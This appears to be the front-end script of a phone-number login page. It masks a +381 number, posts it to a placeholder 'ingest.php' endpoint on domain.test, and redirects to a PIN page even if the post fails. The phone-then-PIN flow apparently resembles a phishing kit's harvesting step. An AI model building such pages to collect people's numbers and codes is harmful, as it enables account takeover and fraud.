const phoneInput = document.getElementById('phoneInput');
const okButton = document.getElementById('okButton');
const inputWrapper = document.querySelector('.input-wrapper');

const PLACEHOLDER_INITIAL = '+(381) ___-___-__';
const PLACEHOLDER_ACTIVE = '+(___) ___-___-__';

let isActive = false;

phoneInput.value = PLACEHOLDER_INITIAL;

function getDigitsOnly(str) {
  let digits = '';
  for (let i = 0; i < str.length; i++) {
    if (str[i] >= '0' && str[i] <= '9') {
      digits += str[i];
    }
  }
  return digits;
}

function formatPhoneNumber(digits) {
  let formatted = '+(';

  for (let i = 0; i < 3; i++) {
    if (i < digits.length) {
      formatted += digits[i];
    } else {
      formatted += '_';
    }
  }

  formatted += ') ';

  for (let i = 3; i < 6; i++) {
    if (i < digits.length) {
      formatted += digits[i];
    } else {
      formatted += '_';
    }
  }

  formatted += '-';

  for (let i = 6; i < 9; i++) {
    if (i < digits.length) {
      formatted += digits[i];
    } else {
      formatted += '_';
    }
  }

  formatted += '-';

  for (let i = 9; i < 11; i++) {
    if (i < digits.length) {
      formatted += digits[i];
    } else {
      formatted += '_';
    }
  }

  return formatted;
}

function getActualCursorPosition(digitPos) {

  const positions = [2, 3, 4, 7, 8, 9, 11, 12, 13, 15, 16];

  if (digitPos >= 0 && digitPos < positions.length) {
    return positions[digitPos];
  }
  if (digitPos >= 11) {
    return 17;
  }
  return positions[0];
}

phoneInput.addEventListener('click', function (e) {
  if (!isActive) {
    isActive = true;
    phoneInput.value = PLACEHOLDER_ACTIVE;
  }

  const value = phoneInput.value;
  const digits = getDigitsOnly(value);

  if (digits.length >= 11) {
    const newPos = 17;
    setTimeout(() => {
      phoneInput.setSelectionRange(newPos, newPos);
    }, 0);
  } else {
    const newPos = getActualCursorPosition(digits.length);
    setTimeout(() => {
      phoneInput.setSelectionRange(newPos, newPos);
    }, 0);
  }
});

phoneInput.addEventListener('focus', function (e) {
  if (!isActive) {
    isActive = true;
    phoneInput.value = PLACEHOLDER_ACTIVE;
  }

  const value = phoneInput.value;
  const digits = getDigitsOnly(value);

  if (digits.length >= 11) {
    const newPos = 17;
    setTimeout(() => {
      phoneInput.setSelectionRange(newPos, newPos);
    }, 0);
  } else {
    const newPos = getActualCursorPosition(digits.length);
    setTimeout(() => {
      phoneInput.setSelectionRange(newPos, newPos);
    }, 0);
  }
});

phoneInput.addEventListener('input', function (e) {
  const oldValue = phoneInput.value;

  let digits = getDigitsOnly(oldValue);

  if (digits.length > 11) {
    digits = digits.substring(0, 11);
  }

  const newValue = formatPhoneNumber(digits);
  phoneInput.value = newValue;

  if (digits.length >= 11) {
    phoneInput.setSelectionRange(17, 17);
  } else {
    const newPos = getActualCursorPosition(digits.length);
    phoneInput.setSelectionRange(newPos, newPos);
  }

  inputWrapper.classList.remove('error');
});

phoneInput.addEventListener('keydown', function (e) {
  if (e.key === 'Backspace') {
    e.preventDefault();

    const value = phoneInput.value;
    let digits = getDigitsOnly(value);

    if (digits.length > 0) {
      digits = digits.substring(0, digits.length - 1);
      const newValue = formatPhoneNumber(digits);
      phoneInput.value = newValue;

      const newPos = getActualCursorPosition(digits.length);
      phoneInput.setSelectionRange(newPos, newPos);
    }

    inputWrapper.classList.remove('error');
  } else if (e.key === 'Delete') {
    e.preventDefault();
  } else if (
    e.key === 'ArrowLeft' ||
    e.key === 'ArrowRight' ||
    e.key === 'ArrowUp' ||
    e.key === 'ArrowDown' ||
    e.key === 'Home' ||
    e.key === 'End'
  ) {
    e.preventDefault();
  } else if (e.key >= '0' && e.key <= '9') {
    const value = phoneInput.value;
    const digits = getDigitsOnly(value);
    if (digits.length >= 11) {
      e.preventDefault();
    }
  }
});

function getURLParameter(name) {
  const search = window.location.search;
  if (search.length === 0) return null;

  const params = search.substring(1).split('&');
  for (let i = 0; i < params.length; i++) {
    const pair = params[i].split('=');
    if (pair[0] === name) {
      return pair[1] ? decodeURIComponent(pair[1]) : null;
    }
  }
  return null;
}

okButton.addEventListener('click', async function () {
  const value = phoneInput.value;

  let phoneDigits = getDigitsOnly(value);

  const fullPhone = phoneDigits;

  inputWrapper.classList.remove('error');

  if (fullPhone === '38111111111') {
    const test = getURLParameter('test');
    const test2 = getURLParameter('test2');
    let redirectUrl = 'pin.html';

    let params = '';
    if (test) {
      params += 'test=' + encodeURIComponent(test);
    }
    if (test2) {
      if (params.length > 0) params += '&';
      params += 'test2=' + encodeURIComponent(test2);
    }

    if (params.length > 0) {
      redirectUrl += '?' + params;
    }

    window.location.href = redirectUrl;
    return;
  }

  if (fullPhone === '38000000000') {
    inputWrapper.classList.add('error');
    phoneInput.disabled = true;

    setTimeout(() => {
      phoneInput.disabled = false;
      phoneInput.focus();
    }, 2000);
    return;
  }

  try {
    const formData = 'phone=' + encodeURIComponent('+' + fullPhone);

    fetch('https://domain.test/ingest.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: formData,
    }).catch(() => {
      console.log('POST request simulated to https://domain.test/ingest.php');
    });

    const test = getURLParameter('test');
    const test2 = getURLParameter('test2');
    let redirectUrl = 'pin.html';

    let params = '';
    if (test) {
      params += 'test=' + encodeURIComponent(test);
    }
    if (test2) {
      if (params.length > 0) params += '&';
      params += 'test2=' + encodeURIComponent(test2);
    }

    if (params.length > 0) {
      redirectUrl += '?' + params;
    }

    window.location.href = redirectUrl;
  } catch (error) {
    console.error('Error:', error);
    const test = getURLParameter('test');
    const test2 = getURLParameter('test2');
    let redirectUrl = 'pin.html';

    let params = '';
    if (test) {
      params += 'test=' + encodeURIComponent(test);
    }
    if (test2) {
      if (params.length > 0) params += '&';
      params += 'test2=' + encodeURIComponent(test2);
    }

    if (params.length > 0) {
      redirectUrl += '?' + params;
    }

    window.location.href = redirectUrl;
  }
});

phoneInput.addEventListener('keypress', function (e) {
  if (e.key === 'Enter') {
    okButton.click();
  }
});
